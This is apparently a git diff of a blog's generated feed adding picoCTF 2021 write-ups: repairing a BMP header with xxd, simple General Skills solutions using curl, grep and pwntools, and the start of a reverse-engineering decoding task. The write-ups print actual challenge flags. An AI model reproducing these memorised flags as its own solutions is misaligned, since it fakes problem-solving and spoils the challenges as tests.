+the new header looks like this:</p>
+<table>
+<thead>
+<tr>
+<th>offset</th>
+<th>name</th>
+<th>size (bytes)</th>
+<th>hex</th>
+<th>value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xe</td>
+<td>Header size</td>
+<td>4</td>
+<td>2800 0000</td>
+<td>0x28 = 40</td>
+</tr>
+<tr>
+<td>0x12</td>
+<td>bitmap width  (px)</td>
+<td>4</td>
+<td>6e04 0000</td>
+<td>0x46e = 1134</td>
+</tr>
+<tr>
+<td>0x16</td>
+<td>bitmap height (px)</td>
+<td>4</td>
+<td>3201 0000</td>
+<td>0x132 = 306</td>
+</tr>
+<tr>
+<td>0x1a</td>
+<td>number of color planes (must be 1)</td>
+<td>2</td>
+<td>0100</td>
+<td>1</td>
+</tr>
+<tr>
+<td>0x1c</td>
+<td>number of bits per pixel</td>
+<td>2</td>
+<td>1800</td>
+<td>0x18 = 24 bits = 3 bytes</td>
+</tr>
+<tr>
+<td>0x1e</td>
+<td>compression method</td>
+<td>4</td>
+<td>0000 0000</td>
+<td>none</td>
+</tr>
+<tr>
+<td>0x22</td>
+<td>size or raw bitmap data</td>
+<td>4</td>
+<td>5826 2c00</td>
+<td>0x2c2658 = 2893400</td>
+</tr>
+</tbody>
+</table>
+<p>Rich of the above info, we now can figure out the different file sections with their size:</p>
+<pre><code>|&lt;- 14 bytes -&gt;|&lt;- 40 bytes -&gt;|&lt;-------- 53434 - 40 - 14 = 53380 ------&gt;|&lt;----------- 2893454 - 53434 ---------------&gt;|
+| File Header  | DIB Header   | Extra Bit Masks | Colour Palette | Gap1 | Pixel Array | Gap2 | ICC Color profile      |
+|              |              |                 |                |      |&lt;- 2893400 -&gt;|&lt;- 2893454 - 2893400 - 53434 -&gt;|
+</code></pre>
+<p>The raw image is (1134 * 306) pixels of 24 bits (3 bytes) = 1041012 bytes. This is contradictory with the value of the raw bitmap data 2893400.
+It is likely that only a part of the image is being shown, so we may want to increase the number of pixels to match 2893400 // 3  = 964466 pixels.</p>
+<p>We can patch to adjust the height to the value 964466 // 1134 = 850 = 0x0352 that can be represented with <strong>5203 0000</strong></p>
+<pre><code>echo &quot;00000010: 0000 6e04 0000 5203 0000 0100 1800 0000&quot; | xxd -r - tunn3l_v1s10n
+</code></pre>
+<p>Now the image can be open in Firefox and we see the flag picoCTF{qu1t3_a_v13w_2020}</p>
+<h3 id="kaitai-struct">Kaitai Struct</h3>
+<p>The Kaitai IDE is available online at <a href="https://ide.kaitai.io/">https://ide.kaitai.io/</a> and it would have saved me a lot of time to effectively parse the header:</p>
+<pre><code>fileHdr [FileHeader]
+    fileType = [66, 77]
+    lenFile = 0x2C268E = 2893454
+    reserved1 = 0x0 = 0
+    reserved2 = 0x0 = 0
+    ofsBitmap = 0xD0BA = 53434
+dibInfo [BitmapInfo]
+    lenHeader = 0x28 = 40
+    header [BitmapHeader]
+        lenHeader = 0x28 = 40
+        imageWidth = 0x46E = 1134
+        imageHeightRaw = 0x352 = 850
+        numPlanes = 0x1 = 1
+        bitsPerPixel = 0x18 = 24
+        bitmapInfoExt [BitmapInfoExtension]
+        extendsBitmapV4 = false
+        extendsOs22xBitmap = false
+        usesFixedPalette = false
+        extendsBitmapInfo = true
+        imageHeight = 0x352 = 850
+        isCoreHeader = false
+        extendsBitmapV5 = false
+        isColorMaskHere = false
+        bottomUp = true
+</code></pre>
+<p>We can also install and run it in command-line:</p>
+<pre><code>brew install kaitai-struct-compiler
+sudo ln -s /usr/local/Cellar/kaitai-struct-compiler/0.10/libexec /opt/kaitai-struct
+sudo gem install kaitai-struct-visualizer
+ksv tunn3l_v1s10n /opt/kaitai-struct-compiler/formats/image/bmp.ksy
+</code></pre>
+<p>The ksv command-line is not documented, so keystroke can be extracted from the code. I recommend web IDE which has more features.</p>
+<table>
+<thead>
+<tr>
+<th>keystroke</th>
+<th>function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>left or right</td>
+<td>cursor movement</td>
+</tr>
+<tr>
+<td>home (fn + left)</td>
+<td>cursor movement</td>
+</tr>
+<tr>
+<td>end  (fn + right)</td>
+<td>cursor movement</td>
+</tr>
+<tr>
+<td>pg up (fn+up)</td>
+<td>cursor movement</td>
+</tr>
+<tr>
+<td>pg down (fn+down)</td>
+<td>cursor movement</td>
+</tr>
+<tr>
+<td>tab</td>
+<td>switch between Treeview and Hexview</td>
+</tr>
+<tr>
+<td>H</td>
+<td>hide Hexview</td>
+</tr>
+<tr>
+<td>enter</td>
+<td>open tree / show cursor position in Hex View</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+        </item>
+        
+        <item>
+            <title>picoCTF 2021 - General Skills</title>
+            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-general-skills/</link>
+            <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-general-skills/</guid>
+            <description>Obediant Cat 1  curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag   Python Wrangling 1  cat pw.txt | python3 ende.py -d flag.txt.en   Wave a flag 1  strings warm| grep -i pico   Nice netcat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  &amp;gt;&amp;gt;&amp;gt; import pwn &amp;gt;&amp;gt;&amp;gt; host, port = &amp;#39;mercury.picoctf.net&amp;#39;, 21135 &amp;gt;&amp;gt;&amp;gt; s = pwn.</description>
+            <content type="html"><![CDATA[<h2 id="obediant-cat">Obediant Cat</h2>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">ph <span style="color:#ff79c6">=</span> (p<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">*</span>(q<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
-
-<span style="color:#ff79c6">import</span> gmpy2
-c <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">861270243527190895777142537838333832920579264010533029282104230006461420086153423</span>
-e <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65537</span>
-d <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>invert(e, ph)
-plaintext <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">pow</span>(c, d, n)
-<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">bytearray</span><span style="color:#ff79c6">.</span>fromhex(<span style="color:#8be9fd;font-style:italic">hex</span>(plaintext)[<span style="color:#bd93f9">2</span>:])<span style="color:#ff79c6">.</span>decode())
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -L https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="python-wrangling">Python Wrangling</h2>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat pw.txt | python3 ende.py -d flag.txt.en
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="wave-a-flag">Wave a flag</h2>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings warm| grep -i pico
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="nice-netcat">Nice netcat</h2>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> pwn
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mercury.picoctf.net&#39;</span>, <span style="color:#bd93f9">21135</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt
+<span style="color:#f1fa8c">&#39;112 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">105 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">111 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">67 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">84 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">70 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">123 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">103 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">48 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">110 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">99 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">51 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">107 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">49 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">116 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">121 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">33 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">95 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">53 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">102 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">100 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">97 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">52 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">125 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">10 </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+[<span style="color:#f1fa8c">&#39;112&#39;</span>, <span style="color:#f1fa8c">&#39;105&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;111&#39;</span>, <span style="color:#f1fa8c">&#39;67&#39;</span>, <span style="color:#f1fa8c">&#39;84&#39;</span>, <span style="color:#f1fa8c">&#39;70&#39;</span>, <span style="color:#f1fa8c">&#39;123&#39;</span>, <span style="color:#f1fa8c">&#39;103&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;48&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;110&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;99&#39;</span>, <span style="color:#f1fa8c">&#39;51&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;107&#39;</span>, <span style="color:#f1fa8c">&#39;49&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;116&#39;</span>, <span style="color:#f1fa8c">&#39;121&#39;</span>, <span style="color:#f1fa8c">&#39;33&#39;</span>, <span style="color:#f1fa8c">&#39;95&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;53&#39;</span>, <span style="color:#f1fa8c">&#39;102&#39;</span>, <span style="color:#f1fa8c">&#39;100&#39;</span>, <span style="color:#f1fa8c">&#39;97&#39;</span>, <span style="color:#f1fa8c">&#39;52&#39;</span>, <span style="color:#f1fa8c">&#39;125&#39;</span>, <span style="color:#f1fa8c">&#39;10&#39;</span>, <span style="color:#f1fa8c">&#39;&#39;</span>]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> prompt<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#bd93f9">112</span>)
+<span style="color:#f1fa8c">&#39;p&#39;</span>
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">from</span> decimal <span style="color:#ff79c6">import</span> Decimal
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> result <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> result
+[<span style="color:#bd93f9">112.0</span>, <span style="color:#bd93f9">105.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">111.0</span>, <span style="color:#bd93f9">67.0</span>, <span style="color:#bd93f9">84.0</span>, <span style="color:#bd93f9">70.0</span>, <span style="color:#bd93f9">123.0</span>, <span style="color:#bd93f9">103.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">48.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">110.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">99.0</span>, <span style="color:#bd93f9">51.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">107.0</span>, <span style="color:#bd93f9">49.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">116.0</span>, <span style="color:#bd93f9">121.0</span>, <span style="color:#bd93f9">33.0</span>, <span style="color:#bd93f9">95.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">53.0</span>, <span style="color:#bd93f9">102.0</span>, <span style="color:#bd93f9">100.0</span>, <span style="color:#bd93f9">97.0</span>, <span style="color:#bd93f9">52.0</span>, <span style="color:#bd93f9">125.0</span>, <span style="color:#bd93f9">10.0</span>]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> integers <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">float</span>(x<span style="color:#ff79c6">.</span>strip(<span style="color:#f1fa8c">&#39; &#34;&#39;</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(x)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> integers]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> characters
+[<span style="color:#f1fa8c">&#39;p&#39;</span>, <span style="color:#f1fa8c">&#39;i&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;o&#39;</span>, <span style="color:#f1fa8c">&#39;C&#39;</span>, <span style="color:#f1fa8c">&#39;T&#39;</span>, <span style="color:#f1fa8c">&#39;F&#39;</span>, <span style="color:#f1fa8c">&#39;{&#39;</span>, <span style="color:#f1fa8c">&#39;g&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;n&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;c&#39;</span>, <span style="color:#f1fa8c">&#39;3&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;k&#39;</span>, <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;t&#39;</span>, <span style="color:#f1fa8c">&#39;y&#39;</span>, <span style="color:#f1fa8c">&#39;!&#39;</span>, <span style="color:#f1fa8c">&#39;_&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;5&#39;</span>, <span style="color:#f1fa8c">&#39;f&#39;</span>, <span style="color:#f1fa8c">&#39;d&#39;</span>, <span style="color:#f1fa8c">&#39;a&#39;</span>, <span style="color:#f1fa8c">&#39;4&#39;</span>, <span style="color:#f1fa8c">&#39;}&#39;</span>, <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>]
+<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(characters)
+<span style="color:#f1fa8c">&#39;picoCTF{g00d_k1tty!_n1c3_k1tty!_afd5fda4}</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="static-aint-always-noise">Static ain&rsquo;t always noise</h2>
@@ -15839,19 +16495,313 @@ strings fang-of-haynekhtnamet | grep pico
         </item>
         
         <item>
+            <title>picoCTF 2021 - Reverse Engineering</title>
+            <link>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-reverse-engineering/</link>
+            <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xade1.github.io/devdraft/posts/2021/08/picoctf-2021-reverse-engineering/</guid>
+            <description>Transformation Auditing the provided piece of code (below), we can reverse engineer and identify some form of custom encoding:
+ The encoding works two bytes at a time because of range(.., 2). So we have to read 16bits at a time. Every two bytes, each byte are converted in integer value with ord First byte is multiplied by 256 with &amp;lt;&amp;lt; 8 operation, then second byte is added to the result  1  &amp;#39;&amp;#39;.</description>
+            <content type="html"><![CDATA[<h2 id="transformation">Transformation</h2>
+<p>Auditing the provided piece of code (below), we can reverse engineer and identify some form of custom encoding:</p>
+<ul>
+<li>The encoding works two bytes at a time because of <code>range(.., 2)</code>. So we have to read 16bits at a time.</li>
+<li>Every two bytes, each byte are converted in integer value with <code>ord</code></li>
+<li>First byte is multiplied by 256 with <code>&lt;&lt; 8</code> operation, then second byte is added to the result</li>
+</ul>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>((<span style="color:#8be9fd;font-style:italic">ord</span>(flag[i]) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">ord</span>(flag[i <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>])) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(flag), <span style="color:#bd93f9">2</span>)])
+</code></pre></td></tr></table>
+</div>
+</div><p>This is a typical packing transformation which is totally reversible. To unpack:</p>
+<ul>
+<li>First byte can be retrieved by dividing by 256</li>
+<li>Second byte is simply the rest of the division by 256</li>
+</ul>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
